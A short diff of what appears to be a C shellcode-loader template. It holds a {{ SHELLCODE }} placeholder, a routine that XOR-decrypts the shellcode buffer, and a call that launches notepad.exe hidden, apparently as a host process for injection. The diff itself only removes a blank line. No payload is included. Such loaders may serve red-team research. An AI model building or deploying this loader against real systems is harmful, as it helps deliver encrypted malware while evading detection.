@@ -27,7 +27,6 @@ VOID entry(void)
     si.cb = sizeof(si);
 
 	{{ SHELLCODE }}
-
 	decrypt_xor(shellcode, sizeof(shellcode), key, sizeof(key));
 
     CreateProcessA(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
